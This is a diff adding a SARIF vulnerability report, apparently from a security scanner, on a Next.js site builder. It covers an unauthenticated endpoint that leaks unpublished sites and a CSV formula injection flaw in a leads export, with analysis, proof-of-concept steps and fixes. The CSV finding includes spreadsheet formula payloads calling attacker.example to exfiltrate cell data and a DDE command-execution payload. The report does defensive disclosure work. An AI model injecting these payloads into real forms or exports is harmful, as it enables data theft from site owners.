@@ -1,0 +1,242 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Strix",
+          "informationUri": "https://strix.ai",
+          "rules": [
+            {
+              "id": "CWE-200",
+              "name": "Unauthenticated disclosure of unpublished sites in GET /api/map-sites",
+              "shortDescription": {
+                "text": "Unauthenticated disclosure of unpublished sites in GET /api/map-sites"
+              },
+              "fullDescription": {
+                "text": "The public, unauthenticated `GET /api/map-sites` endpoint returns the business name, internal site ID, and location of every site that has a non-null `location` field, including sites that are still in private `DRAFT` or `GENERATED` status and have never been published. This exposes private business metadata of users who have not chosen to make their site public."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "text": "The public, unauthenticated `GET /api/map-sites` endpoint returns the business name, internal site ID, and location of every site that has a non-null `location` field, including sites that are still in private `DRAFT` or `GENERATED` status and have never been published. This exposes private business metadata of users who have not chosen to make their site public.\n\nUnauthenticated attackers can enumerate the private business metadata (business name and operating location) of every site in the system, including unpublished `DRAFT` and `GENERATED` projects. This discloses information users have not opted to make public and can be used to build targeted reconnaissance, or to identify and infer the existence of in-progress businesses before they launch.\n\nRestrict the map listing to publicly published sites only. Add a `status: \"PUBLISHED\"` filter to the Prisma `where` clause so that `DRAFT` and `GENERATED` (unpublished) sites are excluded, mirroring the public-site access rules already used by the `/s/{slug}`, `/d/{domain}`, and `/api/public/sites/{slug}/...` routes. Optionally also require that the returned `PUBLISHED` sites belong to a user with an active plan when publishing is gated on it, and consider whether `businessName`/`location` should be considered public metadata at all for a map feature. Apply the same status gate consistently on any future aggregation endpoint.",
+                "markdown": "The public, unauthenticated `GET /api/map-sites` endpoint returns the business name, internal site ID, and location of every site that has a non-null `location` field, including sites that are still in private `DRAFT` or `GENERATED` status and have never been published. This exposes private business metadata of users who have not chosen to make their site public.\n\nUnauthenticated attackers can enumerate the private business metadata (business name and operating location) of every site in the system, including unpublished `DRAFT` and `GENERATED` projects. This discloses information users have not opted to make public and can be used to build targeted reconnaissance, or to identify and infer the existence of in-progress businesses before they launch.\n\nRestrict the map listing to publicly published sites only. Add a `status: \"PUBLISHED\"` filter to the Prisma `where` clause so that `DRAFT` and `GENERATED` (unpublished) sites are excluded, mirroring the public-site access rules already used by the `/s/{slug}`, `/d/{domain}`, and `/api/public/sites/{slug}/...` routes. Optionally also require that the returned `PUBLISHED` sites belong to a user with an active plan when publishing is gated on it, and consider whether `businessName`/`location` should be considered public metadata at all for a map feature. Apply the same status gate consistently on any future aggregation endpoint."
+              },
+              "properties": {
+                "security-severity": "5.3",
+                "tags": [
+                  "security",
+                  "CWE-200",
+                  "stride:I"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/200.html"
+            },
+            {
+              "id": "CWE-1236",
+              "name": "CSV Formula Injection in exported leads spreadsheet",
+              "shortDescription": {
+                "text": "CSV Formula Injection in exported leads spreadsheet"
+              },
+              "fullDescription": {
+                "text": "The leads CSV export endpoint serializes user-controlled lead fields (name, email, phone, message) without neutralizing spreadsheet formula triggers. A malicious visitor can submit a lead whose fields begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code>, and when the site owner downloads and opens the exported CSV in a spreadsheet application, the injected cells are evaluated as formulas, enabling data exfiltration or further client-side attacks."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "text": "The leads CSV export endpoint serializes user-controlled lead fields (name, email, phone, message) without neutralizing spreadsheet formula triggers. A malicious visitor can submit a lead whose fields begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code>, and when the site owner downloads and opens the exported CSV in a spreadsheet application, the injected cells are evaluated as formulas, enabling data exfiltration or further client-side attacks.\n\nA public visitor submits a crafted lead with their message or name set to a spreadsheet formula, e.g. <code>=HYPERLINK(\"http://attacker.example/x?\"&A1,\"click\")</code> or <code>=cmd|' /C calc'!A0</code>. The site owner later downloads the leads CSV and opens it in Excel, LibreOffice Calc, or Google Sheets. The formula executes: cell references can be exfiltrated to an attacker-controlled server (e.g. leaking the spreadsheet's cell contents), and DDE-style payloads can trigger local command execution. The attack requires only the visit of one hostile lead and the owner opening the export in a spreadsheet client.\n\nUpdate the CSV cell serializer to neutralize cells whose value begins with a spreadsheet formula trigger (`=`, `+`, `-`, or `@`) by prefixing a single apostrophe (`'`) so spreadsheet clients render the value as literal text instead of evaluating it. Reject or strip formula-triggering leading characters at the public leads input schema as defense in depth. Ensure the fix applies to all lead fields included in the export (name, email, phone, message).",
+                "markdown": "The leads CSV export endpoint serializes user-controlled lead fields (name, email, phone, message) without neutralizing spreadsheet formula triggers. A malicious visitor can submit a lead whose fields begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code>, and when the site owner downloads and opens the exported CSV in a spreadsheet application, the injected cells are evaluated as formulas, enabling data exfiltration or further client-side attacks.\n\nA public visitor submits a crafted lead with their message or name set to a spreadsheet formula, e.g. <code>=HYPERLINK(\"http://attacker.example/x?\"&A1,\"click\")</code> or <code>=cmd|' /C calc'!A0</code>. The site owner later downloads the leads CSV and opens it in Excel, LibreOffice Calc, or Google Sheets. The formula executes: cell references can be exfiltrated to an attacker-controlled server (e.g. leaking the spreadsheet's cell contents), and DDE-style payloads can trigger local command execution. The attack requires only the visit of one hostile lead and the owner opening the export in a spreadsheet client.\n\nUpdate the CSV cell serializer to neutralize cells whose value begins with a spreadsheet formula trigger (`=`, `+`, `-`, or `@`) by prefixing a single apostrophe (`'`) so spreadsheet clients render the value as literal text instead of evaluating it. Reject or strip formula-triggering leading characters at the public leads input schema as defense in depth. Ensure the fix applies to all lead fields included in the export (name, email, phone, message)."
+              },
+              "properties": {
+                "security-severity": "4.7",
+                "tags": [
+                  "security",
+                  "CWE-1236",
+                  "stride:T",
+                  "stride:I"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/1236.html"
+            }
+          ],
+          "version": "1.5.3"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CWE-200",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Unauthenticated disclosure of unpublished sites in GET /api/map-sites\n\nThe public, unauthenticated `GET /api/map-sites` endpoint returns the business name, internal site ID, and location of every site that has a non-null `location` field, including sites that are still in private `DRAFT` or `GENERATED` status and have never been published. This exposes private business metadata of users who have not chosen to make their site public."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/api/map-sites/route.ts"
+                },
+                "region": {
+                  "startLine": 147,
+                  "endLine": 156,
+                  "snippet": {
+                    "text": "const sites = await prisma.site.findMany({\n      where: { location: { not: null } },\n      select: {\n        id: true,\n        businessName: true,\n        location: true,\n        createdAt: true,\n      },\n      orderBy: { createdAt: \"desc\" },\n      take: 60,\n    });"
+                  }
+                }
+              },
+              "message": {
+                "text": "Add publish-status filter to map query"
+              }
+            },
+            {
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "/api/map-sites",
+                  "kind": "endpoint"
+                }
+              ]
+            }
+          ],
+          "fixes": [
+            {
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "app/api/map-sites/route.ts"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 147,
+                        "endLine": 156
+                      },
+                      "insertedContent": {
+                        "text": "const sites = await prisma.site.findMany({\n      where: { location: { not: null }, status: \"PUBLISHED\" },\n      select: {\n        id: true,\n        businessName: true,\n        location: true,\n        createdAt: true,\n      },\n      orderBy: { createdAt: \"desc\" },\n      take: 60,\n    });"
+                      }
+                    }
+                  ]
+                }
+              ],
+              "description": {
+                "text": "Restrict the map listing to publicly published sites only. Add a `status: \"PUBLISHED\"` filter to the Prisma `where` clause so that `DRAFT` and `GENERATED` (unpublished) sites are excluded, mirroring the public-site access rules already used by the `/s/{slug}`, `/d/{domain}`, and `/api/public/sites/{slug}/...` routes. Optionally also require that the returned `PUBLISHED` sites belong to a user with an active plan when publishing is gated on it, and consider whether `businessName`/`location` should be considered public metadata at all for a map feature. Apply the same status gate consistently on any future aggregation endpoint.",
+                "markdown": "Restrict the map listing to publicly published sites only. Add a `status: \"PUBLISHED\"` filter to the Prisma `where` clause so that `DRAFT` and `GENERATED` (unpublished) sites are excluded, mirroring the public-site access rules already used by the `/s/{slug}`, `/d/{domain}`, and `/api/public/sites/{slug}/...` routes. Optionally also require that the returned `PUBLISHED` sites belong to a user with an active plan when publishing is gated on it, and consider whether `businessName`/`location` should be considered public metadata at all for a map feature. Apply the same status gate consistently on any future aggregation endpoint."
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "94041e056e7335fec40c0f468a5d0e8e292ac3bd9caf63414251cf11e3198939"
+          },
+          "properties": {
+            "security-severity": "5.3",
+            "strix_vuln_class_hash": "46cc00c6ec6c7429084c424e9b24aa5227bdaa8ab1d2b8753d0547098551a937",
+            "strix": {
+              "id": "vuln-0001",
+              "severity": "medium",
+              "cvss": 5.3,
+              "timestamp": "2026-08-10 19:45:03 UTC",
+              "target": "Cluster Web Builder (Next.js app) /api/map-sites",
+              "endpoint": "/api/map-sites",
+              "method": "GET",
+              "cwe": "CWE-200",
+              "impact": "Unauthenticated attackers can enumerate the private business metadata (business name and operating location) of every site in the system, including unpublished `DRAFT` and `GENERATED` projects. This discloses information users have not opted to make public and can be used to build targeted reconnaissance, or to identify and infer the existence of in-progress businesses before they launch.",
+              "technical_analysis": "The route handler in `app/api/map-sites/route.ts` performs a Prisma query with only one filter:\n\n```ts\nconst sites = await prisma.site.findMany({\n  where: { location: { not: null } },\n  select: { id: true, businessName: true, location: true, createdAt: true },\n  orderBy: { createdAt: \"desc\" },\n  take: 60,\n});\n```\n\nThe `where` clause filters solely on `location: { not: null }`. It does **not** filter on `status`, so the query returns sites in all states: `DRAFT`, `GENERATED`, and `PUBLISHED`. In the Prisma schema, `Site.status` defaults to `DRAFT` and is only set to `PUBLISHED` when a user explicitly publishes (see `app/api/sites/[siteId]/publish/route.ts`). Every generated site with a non-null `location` therefore appears, including private drafts.\n\nThe handler also performs **no authentication or authorization** whatsoever. A search for auth helpers (`getUserBySessionToken`, `SESSION_COOKIE`, role checks, `userId` filters) at the top of the file returns nothing. The only protection is a per-IP rate limit (`consumeRateLimit(\"map-sites\", ip, 60, ...)`), which limits volume but does not gate who can call it or what data it returns.\n\nThis means an anonymous caller can enumerate the business name, geographic location, internal site ID, and creation time of any user's private, unpublished project. The `businessName` is user-supplied and often the business's real name; `location` is where the business operates. Both are metadata the user has not opted to disclose (unlike `PUBLISHED` sites, which are intentionally public at `/s/{slug}`).",
+              "remediation_steps": "Restrict the map listing to publicly published sites only. Add a `status: \"PUBLISHED\"` filter to the Prisma `where` clause so that `DRAFT` and `GENERATED` (unpublished) sites are excluded, mirroring the public-site access rules already used by the `/s/{slug}`, `/d/{domain}`, and `/api/public/sites/{slug}/...` routes. Optionally also require that the returned `PUBLISHED` sites belong to a user with an active plan when publishing is gated on it, and consider whether `businessName`/`location` should be considered public metadata at all for a map feature. Apply the same status gate consistently on any future aggregation endpoint.",
+              "poc": {
+                "description": "1. Send an unauthenticated `GET` request to `/api/map-sites`.\n2. Inspect the JSON response.\n3. Create a test site (either as a logged-in user or as a guest) with a `location` value that resolves to a known coordinate, but leave it unpublished (`status = DRAFT`).\n4. Send the `GET /api/map-sites` request again without any session cookie.\n5. Observe that the unpublished site's `businessName`, `id`, `location`, and `createdAt` are present in the anonymous response alongside published sites, confirming unauthorized disclosure of a private draft.",
+                "script_available": true
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-1236",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "CSV Formula Injection in exported leads spreadsheet\n\nThe leads CSV export endpoint serializes user-controlled lead fields (name, email, phone, message) without neutralizing spreadsheet formula triggers. A malicious visitor can submit a lead whose fields begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code>, and when the site owner downloads and opens the exported CSV in a spreadsheet application, the injected cells are evaluated as formulas, enabling data exfiltration or further client-side attacks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/api/sites/[siteId]/leads/export/route.ts"
+                },
+                "region": {
+                  "startLine": 17,
+                  "endLine": 17,
+                  "snippet": {
+                    "text": "function csvCell(value: string) { return `\"${value.replace(/\"/g, '\"\"')}\"`; }"
+                  }
+                }
+              },
+              "message": {
+                "text": "Neutralize formula triggers in csvCell before writing cells"
+              }
+            },
+            {
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "/api/sites/[siteId]/leads/export",
+                  "kind": "endpoint"
+                }
+              ]
+            }
+          ],
+          "fixes": [
+            {
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "app/api/sites/[siteId]/leads/export/route.ts"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 17,
+                        "endLine": 17
+                      },
+                      "insertedContent": {
+                        "text": "function csvCell(value: string) {\n  const neutralized = /^[=+@\\-]/.test(value) ? `'${value}` : value;\n  return `\"${neutralized.replace(/\"/g, '\"\"')}\"`;\n}"
+                      }
+                    }
+                  ]
+                }
+              ],
+              "description": {
+                "text": "Update the CSV cell serializer to neutralize cells whose value begins with a spreadsheet formula trigger (`=`, `+`, `-`, or `@`) by prefixing a single apostrophe (`'`) so spreadsheet clients render the value as literal text instead of evaluating it. Reject or strip formula-triggering leading characters at the public leads input schema as defense in depth. Ensure the fix applies to all lead fields included in the export (name, email, phone, message).",
+                "markdown": "Update the CSV cell serializer to neutralize cells whose value begins with a spreadsheet formula trigger (`=`, `+`, `-`, or `@`) by prefixing a single apostrophe (`'`) so spreadsheet clients render the value as literal text instead of evaluating it. Reject or strip formula-triggering leading characters at the public leads input schema as defense in depth. Ensure the fix applies to all lead fields included in the export (name, email, phone, message)."
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "e4c150379992ce09f9e75be9830c0e52329948f720c54e6d146c101fc8f9e3a2"
+          },
+          "properties": {
+            "security-severity": "4.7",
+            "strix_vuln_class_hash": "a9a9bd391c3d7f6cca3d35fd1bb191d46dfb7f75463120ac94215c54a2c7c270",
+            "strix": {
+              "id": "vuln-0002",
+              "severity": "medium",
+              "cvss": 4.7,
+              "timestamp": "2026-08-10 19:46:30 UTC",
+              "target": "/workspace/strix-target-20260810-130438",
+              "endpoint": "/api/sites/[siteId]/leads/export",
+              "method": "GET",
+              "cwe": "CWE-1236",
+              "impact": "A public visitor submits a crafted lead with their message or name set to a spreadsheet formula, e.g. <code>=HYPERLINK(\"http://attacker.example/x?\"&A1,\"click\")</code> or <code>=cmd|' /C calc'!A0</code>. The site owner later downloads the leads CSV and opens it in Excel, LibreOffice Calc, or Google Sheets. The formula executes: cell references can be exfiltrated to an attacker-controlled server (e.g. leaking the spreadsheet's cell contents), and DDE-style payloads can trigger local command execution. The attack requires only the visit of one hostile lead and the owner opening the export in a spreadsheet client.",
+              "technical_analysis": "Two routes compose the vulnerable flow:\n\n1. **Attacker-controlled input (no filtering).** <code>POST /api/public/sites/[slug]/leads</code> is unauthenticated (intended for public contact forms) and stores four user-controlled fields verbatim: <code>name</code>, <code>email</code>, <code>phone</code>, <code>message</code>. The only validation is length/format (e.g. <code>message</code> 3-2000 chars). No check strips or escapes leading spreadsheet formula characters (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>).\n\n2. **Vulnerable CSV serialization (no neutralization).** <code>GET /api/sites/[siteId]/leads/export</code> builds CSV rows and passes every field through <code>csvCell</code>:\n\n```ts title=app/api/sites/[siteId]/leads/export/route.ts\nfunction csvCell(value: string) { return `\"${value.replace(/\"/g, '\"\"')}\"`; }\n```\n\nThis only escapes embedded double quotes. It does not prefix cells that begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> with a neutral character (e.g. a leading apostrophe <code>'</code> or tab). Consequently a field such as <code>=HYPERLINK(\"http://attacker.example/?\"&A1,\"x\")</code> is written into the CSV verbatim.\n\nModern spreadsheet applications import CSV and evaluate cells starting with these characters as formulas (or, for <code>=cmd|</code> in legacy modes, DDE payloads). The exported file is served as <code>text/csv</code> with a <code>.csv</code> attachment filename.",
+              "remediation_steps": "Update the CSV cell serializer to neutralize cells whose value begins with a spreadsheet formula trigger (`=`, `+`, `-`, or `@`) by prefixing a single apostrophe (`'`) so spreadsheet clients render the value as literal text instead of evaluating it. Reject or strip formula-triggering leading characters at the public leads input schema as defense in depth. Ensure the fix applies to all lead fields included in the export (name, email, phone, message).",
+              "poc": {
+                "description": "1. Visit the public URL of any published site, e.g. <code>{{PUBLIC_SITE_BASE}}/api/public/sites/<slug>/leads</code>.\n2. POST a JSON lead using the public (unauthenticated) leads endpoint with a formula-bearing field:\n   <pre><code>{\"name\":\"Attacker\",\"email\":\"a@b.c\",\"phone\":\"\",\"message\":\"=HYPERLINK(\\\"http://attacker.example/leak?val=\\\"&amp;B2,\\\"click\\\")\"}</code></pre>\n3. The lead is stored verbatim (only length/format checks apply).\n4. As the site owner, call <code>GET /api/sites/<siteId>/leads/export</code> to download the CSV.\n5. Open the resulting <code>.csv</code> in Excel, LibreOffice Calc, or Google Sheets and observe that the message cell is evaluated as a formula (external request fired to the attacker's URL / hyperlink activated) rather than rendered as literal text.",
+                "script_available": true
+              }
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
